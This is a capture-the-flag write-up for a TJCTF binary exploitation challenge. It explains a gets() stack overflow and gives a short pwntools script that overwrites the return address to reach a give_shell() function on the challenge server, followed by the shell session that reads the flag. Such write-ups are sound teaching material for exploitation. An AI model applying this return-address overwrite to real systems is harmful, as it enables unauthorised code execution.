### Solved by superkojiman

Simple overflow using gets. We need to redirect execution to give_shell(). We can find its address in gdb:

```
gdb-peda$ p give_shell
$1 = {<text variable, no debug info>} 0x8048505 <give_shell>
```


We can overwrite the saved return pointer in the name() function by sending 116 bytes. Pretty easy, so have it return to give_shell(): 

```python
#!/usr/bin/env python 
from pwn import *

give_shell = p32(0x8048505)

buf = ""
buf += "A"*112 + give_shell

r = remote("p.tjctf.org", 8094)
print r.recv()
r.send(buf + "\n");
r.interactive()
```

Let's grab that flag: 

```text
koji@pwnbox32:~/Desktop/rop-1$ ./sploit.py 
[+] Opening connection to p.tjctf.org on port 8094: Done
Enter your name 
[*] Switching to interactive mode
$ id
uid=1000(app) gid=1000(app) groups=1000(app)
$ ls
Dockerfile
etc
flag
prog
rop1
wrapper
$ cat flag
isnt_ret_a_nice_instruction
```

The flag is: isnt_ret_a_nice_instruction
